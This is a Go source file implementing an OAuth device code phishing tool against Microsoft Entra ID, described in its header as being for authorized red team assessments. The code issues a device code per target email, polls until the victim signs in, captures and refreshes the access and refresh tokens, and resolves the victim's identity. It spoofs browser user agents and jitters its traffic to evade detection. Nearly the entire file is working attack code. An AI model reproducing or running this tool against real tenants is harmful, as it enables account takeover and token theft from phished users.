// Package devicecode implements the Microsoft Entra ID Device Authorization Grant
// phishing technique for authorized red team assessments.
//
// This abuses the OAuth2 Device Code flow (RFC 8628) where the operator obtains
// a device_code per target, delivers the user_code via phishing, and polls for
// token redemption. When the target authenticates, the token is correlated back
// to their identity via the unique device_code.
//
// Reference: https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code
// Reference: https://github.com/f-bader/TokenTacticsV2
package devicecode

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	deviceAuthURLv2 = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
	tokenURLv2      = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"

	// v1 endpoints — use resource= instead of scope=. Tokens captured via v1
	// can be exchanged for any resource including My Sign-ins (19db86c3-...).
	deviceAuthURLv1 = "https://login.microsoftonline.com/%s/oauth2/devicecode"
	tokenURLv1      = "https://login.microsoftonline.com/%s/oauth2/token?api-version=1.0"
)

// userAgents is a pool of realistic Windows browser user agents used to avoid
// fingerprinting via Go's default "Go-http-client/1.x" header.
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
}

func pickUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// jitterDuration returns d ± up to 30% random jitter.
func jitterDuration(d time.Duration) time.Duration {
	jitter := time.Duration(rand.Int63n(int64(d * 30 / 100)))
	if rand.Intn(2) == 0 {
		return d + jitter
	}
	return d - jitter
}

// FlexInt unmarshals a JSON field that Microsoft returns as either a number or
// a quoted string depending on the endpoint version (v1 uses strings, v2 uses ints).
type FlexInt int

func (f *FlexInt) UnmarshalJSON(b []byte) error {
	// Try number first.
	var n int
	if err := json.Unmarshal(b, &n); err == nil {
		*f = FlexInt(n)
		return nil
	}
	// Fall back to quoted string.
	var s string
	if err := json.Unmarshal(b, &s); err != nil {
		return err
	}
	n, err := strconv.Atoi(s)
	if err != nil {
		return fmt.Errorf("FlexInt: cannot parse %q: %w", s, err)
	}
	*f = FlexInt(n)
	return nil
}

// DeviceCodeResponse is what Microsoft returns when we initiate a device flow.
// v1 uses "verification_url"; v2 uses "verification_uri" — we accept both.
type DeviceCodeResponse struct {
	DeviceCode      string  `json:"device_code"`
	UserCode        string  `json:"user_code"`
	VerificationURI string  `json:"verification_uri"`
	VerificationURL string  `json:"verification_url"` // v1 alias
	ExpiresIn       FlexInt `json:"expires_in"`
	Interval        FlexInt `json:"interval"`
	Message         string  `json:"message"`

	// Internal tracking
	TargetID    string    `json:"target_id"`
	TargetEmail string    `json:"target_email"`
	IssuedAt    time.Time `json:"issued_at"`
	ExpiresAt   time.Time `json:"expires_at"`
}

// TokenResult holds the redeemed tokens
type TokenResult struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    FlexInt `json:"expires_in"`
	Scope        string `json:"scope"`

	// Correlation metadata
	TargetID          string    `json:"target_id"`
	TargetEmail       string    `json:"target_email"`
	RedeemedAt        time.Time `json:"redeemed_at"`
	UserPrincipalName string    `json:"upn,omitempty"`

	// Extracted from JWT claims at capture time
	TenantID         string `json:"tenant_id,omitempty"`
	CapturedClientID string `json:"captured_client_id,omitempty"`

	// Set for tokens obtained via Token Exchange (not device code capture).
	Label       string `json:"label,omitempty"`        // e.g. "Microsoft Graph"
	Source      string `json:"source,omitempty"`       // "exchange" when set
	ReqScope    string `json:"req_scope,omitempty"`    // v2 scope used for exchange
	ReqResource string `json:"req_resource,omitempty"` // v1 resource used for exchange
}

// jwtClaims holds the subset of JWT claims we care about.
type jwtClaims struct {
	TenantID string `json:"tid"`
	AppID    string `json:"appid"` // v1 tokens
	AZP      string `json:"azp"`   // v2 tokens (authorized party)
	OID      string `json:"oid"`
	UPN      string `json:"upn"`
	UniqName string `json:"unique_name"`
}

// extractJWTClaims parses the payload of a JWT (no signature verification —
// we only need metadata we trust because it came from our own capture).
func extractJWTClaims(token string) (jwtClaims, error) {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) != 3 {
		return jwtClaims{}, fmt.Errorf("not a JWT")
	}
	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return jwtClaims{}, fmt.Errorf("decoding JWT payload: %w", err)
	}
	var c jwtClaims
	json.Unmarshal(payload, &c)
	return c, nil
}

// PollError types from Microsoft
type pollError struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
}

// SessionState tracks the state of a single device code session
type SessionState int

const (
	StateInitializing SessionState = iota
	StatePending      // user_code delivered, waiting for auth
	StateCompleted    // token received
	StateExpired
	StateError
	StateCancelled
)

func (s SessionState) String() string {
	switch s {
	case StateInitializing:
		return "initializing"
	case StatePending:
		return "pending"
	case StateCompleted:
		return "completed"
	case StateExpired:
		return "expired"
	case StateError:
		return "error"
	case StateCancelled:
		return "cancelled"
	default:
		return "unknown"
	}
}

// Session tracks one device code flow for one target
type Session struct {
	mu         sync.RWMutex
	DeviceCode *DeviceCodeResponse
	Result     *TokenResult
	State      SessionState
	ErrorMsg   string
	LastPolled time.Time
	PollCount  int
	cancel     context.CancelFunc // cancels this session's polling goroutine
}

func (s *Session) GetState() SessionState {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.State
}

func (s *Session) GetResult() *TokenResult {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.Result
}

// Engine manages all device code sessions for a campaign.
// Each engine instance picks a single user agent at creation time so all
// requests within one campaign appear to come from the same browser.
type Engine struct {
	mu       sync.RWMutex
	sessions map[string]*Session // keyed by target ID

	tenantID   string
	clientID   string
	scope      string // v2 scope string OR v1 resource URL (when captureV1=true)
	captureV1  bool   // use v1 endpoints with resource= instead of v2 scope=
	requireMFA bool   // add claims to force MFA during device code auth
	debug      bool   // log full request/response bodies for troubleshooting
	interval   time.Duration
	userAgent  string // fixed for this engine instance

	// Channel for completed sessions
	Results chan *TokenResult

	httpClient *http.Client
}

func NewEngine(tenantID, clientID, scope string, pollIntervalSec int, captureV1, requireMFA, debug bool) *Engine {
	interval := time.Duration(pollIntervalSec) * time.Second
	if interval < 5*time.Second {
		interval = 5 * time.Second // Microsoft minimum
	}
	// Auto-detect v1 mode: if scope is a resource URL (https:// or urn:), the
	// operator clearly wants v1 endpoints (resource= param). No need to set
	// capture_v1 = true in config when the scope already makes the intent clear.
	if !captureV1 && (strings.HasPrefix(scope, "https://") || strings.HasPrefix(scope, "urn:")) {
		captureV1 = true
	}
	return &Engine{
		sessions:   make(map[string]*Session),
		tenantID:   tenantID,
		clientID:   clientID,
		scope:      scope,
		captureV1:  captureV1,
		requireMFA: requireMFA,
		debug:      debug,
		interval:   interval,
		userAgent:  pickUA(),
		Results:    make(chan *TokenResult, 256),
		httpClient: &http.Client{Timeout: 30 * time.Second},
	}
}

// newRequest creates an http.Request with the engine's spoofed User-Agent.
func (e *Engine) newRequest(ctx context.Context, method, url string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequestWithContext(ctx, method, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", e.userAgent)
	return req, nil
}

// RequestDeviceCode initiates a device code flow for one target.
func (e *Engine) RequestDeviceCode(ctx context.Context, targetID, targetEmail string) (*DeviceCodeResponse, error) {
	var authURL string
	if e.captureV1 {
		authURL = fmt.Sprintf(deviceAuthURLv1, e.tenantID)
	} else {
		authURL = fmt.Sprintf(deviceAuthURLv2, e.tenantID)
	}

	form := url.Values{}
	form.Set("client_id", e.clientID)
	if e.captureV1 {
		// v1 endpoint uses resource= (must be a URL or GUID, not a scope string).
		// If the operator left a v2-style scope string, default to Graph.
		resource := e.scope
		if !strings.HasPrefix(resource, "https://") && !strings.HasPrefix(resource, "urn:") {
			resource = "https://graph.microsoft.com"
		}
		form.Set("resource", resource)
	} else {
		form.Set("scope", e.scope)
	}
	if e.requireMFA {
		if e.captureV1 {
			// v1 endpoint uses amr_values= for MFA step-up.
			form.Set("amr_values", "ngcmfa")
		} else {
			// v2 endpoint uses the claims parameter.
			form.Set("claims", `{"access_token":{"amr":{"essential":true,"values":["ngcmfa"]}}}`)
		}
	}

	if e.debug {
		log.Printf("[DEBUG] devicecode → %s  body: %s", authURL, form.Encode())
	}

	req, err := e.newRequest(ctx, "POST", authURL, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, fmt.Errorf("building request: %w", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("device code request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if e.debug {
		log.Printf("[DEBUG] devicecode ← %d  body: %s", resp.StatusCode, string(body))
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("device code endpoint returned %d: %s", resp.StatusCode, string(body))
	}

	var dcr DeviceCodeResponse
	if err := json.Unmarshal(body, &dcr); err != nil {
		return nil, fmt.Errorf("parsing device code response: %w", err)
	}

	dcr.TargetID = targetID
	dcr.TargetEmail = targetEmail
	dcr.IssuedAt = time.Now().UTC()
	dcr.ExpiresAt = dcr.IssuedAt.Add(time.Duration(dcr.ExpiresIn) * time.Second)
	// Normalise v1 "verification_url" → "verification_uri"
	if dcr.VerificationURI == "" && dcr.VerificationURL != "" {
		dcr.VerificationURI = dcr.VerificationURL
	}

	session := &Session{
		DeviceCode: &dcr,
		State:      StatePending,
	}
	e.mu.Lock()
	// Cancel and replace any existing session so the old polling goroutine stops.
	if old, ok := e.sessions[targetID]; ok {
		old.mu.Lock()
		if old.cancel != nil {
			old.cancel()
		}
		old.mu.Unlock()
	}
	e.sessions[targetID] = session
	e.mu.Unlock()

	return &dcr, nil
}

// StartPolling begins polling the token endpoint for a specific target's device code.
// Each poll interval is jittered ±30% to avoid uniform traffic fingerprinting.
func (e *Engine) StartPolling(ctx context.Context, targetID string) {
	e.mu.RLock()
	session, ok := e.sessions[targetID]
	e.mu.RUnlock()
	if !ok {
		return
	}

	// Each session gets its own child context so it can be cancelled independently
	// (e.g. when the target re-scans a QR and a fresh code is issued).
	sessionCtx, cancel := context.WithCancel(ctx)
	session.mu.Lock()
	session.cancel = cancel
	session.mu.Unlock()

	go func() {
		defer cancel()
		for {
			// Jittered sleep instead of a fixed ticker — avoids all goroutines
			// waking and firing requests at the exact same cadence.
			sleep := jitterDuration(e.interval)
			select {
			case <-sessionCtx.Done():
				session.mu.Lock()
				session.State = StateCancelled
				session.mu.Unlock()
				return
			case <-time.After(sleep):
			}

			if time.Now().After(session.DeviceCode.ExpiresAt) {
				session.mu.Lock()
				session.State = StateExpired
				session.mu.Unlock()
				return
			}

			result, done, err := e.poll(sessionCtx, session)
			session.mu.Lock()
			session.LastPolled = time.Now().UTC()
			session.PollCount++
			session.mu.Unlock()

			if err != nil {
				session.mu.Lock()
				session.State = StateError
				session.ErrorMsg = err.Error()
				session.mu.Unlock()
				return
			}

			if done && result != nil {
				e.resolveUPN(sessionCtx, result)

				session.mu.Lock()
				session.State = StateCompleted
				session.Result = result
				session.mu.Unlock()

				select {
				case e.Results <- result:
				default:
				}
				return
			}
		}
	}()
}

func (e *Engine) poll(ctx context.Context, session *Session) (*TokenResult, bool, error) {
	var tokenEndpoint string
	if e.captureV1 {
		tokenEndpoint = fmt.Sprintf(tokenURLv1, e.tenantID)
	} else {
		tokenEndpoint = fmt.Sprintf(tokenURLv2, e.tenantID)
	}

	form := url.Values{}
	form.Set("client_id", e.clientID)
	// Both v1 and v2 use the same URN grant type. The differences are:
	//   v1: field is "code=", and "resource=" must be included
	//   v2: field is "device_code=", no resource
	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
	if e.captureV1 {
		form.Set("code", session.DeviceCode.DeviceCode)
		resource := e.scope
		if !strings.HasPrefix(resource, "https://") && !strings.HasPrefix(resource, "urn:") {
			resource = "https://graph.microsoft.com"
		}
		form.Set("resource", resource)
	} else {
		form.Set("device_code", session.DeviceCode.DeviceCode)
	}

	if e.debug {
		log.Printf("[DEBUG] poll → %s  body: %s", tokenEndpoint, form.Encode())
	}

	req, err := e.newRequest(ctx, "POST", tokenEndpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return nil, false, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if e.debug {
		log.Printf("[DEBUG] poll ← %d  body: %s", resp.StatusCode, string(body))
	}

	if resp.StatusCode == 200 {
		var token TokenResult
		if err := json.Unmarshal(body, &token); err != nil {
			return nil, false, fmt.Errorf("parsing token: %w", err)
		}
		token.TargetID = session.DeviceCode.TargetID
		token.TargetEmail = session.DeviceCode.TargetEmail
		token.RedeemedAt = time.Now().UTC()
		if claims, err := extractJWTClaims(token.AccessToken); err == nil {
			token.TenantID = claims.TenantID
			if claims.AppID != "" {
				token.CapturedClientID = claims.AppID
			} else {
				token.CapturedClientID = claims.AZP
			}
		}
		return &token, true, nil
	}

	var pollErr pollError
	json.Unmarshal(body, &pollErr)
	switch pollErr.Error {
	case "authorization_pending":
		return nil, false, nil
	case "slow_down":
		// Microsoft is asking us to back off — add extra jitter on top
		time.Sleep(jitterDuration(10 * time.Second))
		return nil, false, nil
	case "authorization_declined", "access_denied": // v2 / v1
		return nil, true, fmt.Errorf("target declined authorization")
	case "expired_token", "code_expired": // v2 / v1
		return nil, true, fmt.Errorf("device code expired")
	default:
		desc := pollErr.ErrorDescription
		if pollErr.Error == "" && desc == "" {
			// Empty response or non-JSON body — keep polling.
			return nil, false, nil
		}
		// Log the full error so the operator can see exactly what Microsoft returned.
		log.Printf("[POLL ERROR] target=%s error=%q desc=%q",
			session.DeviceCode.TargetEmail, pollErr.Error, desc)
		return nil, true, fmt.Errorf("%s: %s", pollErr.Error, desc)
	}
}

// resolveUPN calls Microsoft Graph /me to get the UPN from the access token.
func (e *Engine) resolveUPN(ctx context.Context, result *TokenResult) {
	req, err := e.newRequest(ctx, "GET", "https://graph.microsoft.com/v1.0/me", nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+result.AccessToken)

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var me struct {
		UPN         string `json:"userPrincipalName"`
		DisplayName string `json:"displayName"`
		Mail        string `json:"mail"`
	}
	body, _ := io.ReadAll(resp.Body)
	if json.Unmarshal(body, &me) == nil {
		result.UserPrincipalName = me.UPN
	}
}

// RefreshAccessToken exchanges a refresh_token for a new access_token using
// the standard OAuth2 token endpoint. The returned TokenResult contains the new
// tokens; if the server does not return a new refresh_token the caller should
// preserve the original.
func RefreshAccessToken(ctx context.Context, tenantID, clientID, refreshToken, scope string) (*TokenResult, error) {
	endpoint := fmt.Sprintf(tokenURLv2, tenantID)
	form := url.Values{}
	form.Set("grant_type", "refresh_token")
	form.Set("client_id", clientID)
	form.Set("refresh_token", refreshToken)
	if scope != "" {
		form.Set("scope", scope)
	}

	req, err := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", pickUA())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("refresh request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		var pe pollError
		json.Unmarshal(body, &pe)
		return nil, fmt.Errorf("refresh_token exchange failed: %s — %s", pe.Error, pe.ErrorDescription)
	}

	var token TokenResult
	if err := json.Unmarshal(body, &token); err != nil {
		return nil, fmt.Errorf("parsing token response: %w", err)
	}
	token.RedeemedAt = time.Now().UTC()
	return &token, nil
}

// AllSessions returns a snapshot of all sessions
func (e *Engine) AllSessions() map[string]*SessionSnapshot {
	e.mu.RLock()
	defer e.mu.RUnlock()

	out := make(map[string]*SessionSnapshot, len(e.sessions))
	for id, sess := range e.sessions {
		sess.mu.RLock()
		snap := &SessionSnapshot{
			TargetID:        id,
			TargetEmail:     sess.DeviceCode.TargetEmail,
			UserCode:        sess.DeviceCode.UserCode,
			VerificationURI: sess.DeviceCode.VerificationURI,
			State:           sess.State,
			IssuedAt:        sess.DeviceCode.IssuedAt,
			ExpiresAt:       sess.DeviceCode.ExpiresAt,
			LastPolled:      sess.LastPolled,
			PollCount:       sess.PollCount,
			ErrorMsg:        sess.ErrorMsg,
		}
		if sess.Result != nil {
			snap.RedeemedAt = sess.Result.RedeemedAt
			snap.UPN = sess.Result.UserPrincipalName
		}
		sess.mu.RUnlock()
		out[id] = snap
	}
	return out
}

// GetSession returns a snapshot of a specific session
func (e *Engine) GetSession(targetID string) (*SessionSnapshot, bool) {
	e.mu.RLock()
	sess, ok := e.sessions[targetID]
	e.mu.RUnlock()
	if !ok {
		return nil, false
	}

	sess.mu.RLock()
	defer sess.mu.RUnlock()
	snap := &SessionSnapshot{
		TargetID:        targetID,
		TargetEmail:     sess.DeviceCode.TargetEmail,
		UserCode:        sess.DeviceCode.UserCode,
		VerificationURI: sess.DeviceCode.VerificationURI,
		State:           sess.State,
		IssuedAt:        sess.DeviceCode.IssuedAt,
		ExpiresAt:       sess.DeviceCode.ExpiresAt,
		LastPolled:      sess.LastPolled,
		PollCount:       sess.PollCount,
		ErrorMsg:        sess.ErrorMsg,
	}
	if sess.Result != nil {
		snap.RedeemedAt = sess.Result.RedeemedAt
		snap.UPN = sess.Result.UserPrincipalName
	}
	return snap, true
}

// CancelSession cancels polling for a specific target
func (e *Engine) CancelSession(targetID string) {
	e.mu.Lock()
	sess, ok := e.sessions[targetID]
	e.mu.Unlock()
	if !ok {
		return
	}
	sess.mu.Lock()
	sess.State = StateCancelled
	sess.mu.Unlock()
}

// SessionSnapshot is a point-in-time view of a session (safe to return over API)
type SessionSnapshot struct {
	TargetID        string       `json:"target_id"`
	TargetEmail     string       `json:"target_email"`
	UserCode        string       `json:"user_code"`
	VerificationURI string       `json:"verification_uri"`
	State           SessionState `json:"state"`
	StateStr        string       `json:"state_str"`
	IssuedAt        time.Time    `json:"issued_at"`
	ExpiresAt       time.Time    `json:"expires_at"`
	LastPolled      time.Time    `json:"last_polled"`
	PollCount       int          `json:"poll_count"`
	ErrorMsg        string       `json:"error_msg,omitempty"`
	RedeemedAt      time.Time    `json:"redeemed_at,omitempty"`
	UPN             string       `json:"upn,omitempty"`
}

func (s *SessionSnapshot) MarshalJSON() ([]byte, error) {
	type Alias SessionSnapshot
	return json.Marshal(&struct {
		*Alias
		StateStr string `json:"state_str"`
	}{
		Alias:    (*Alias)(s),
		StateStr: s.State.String(),
	})
}
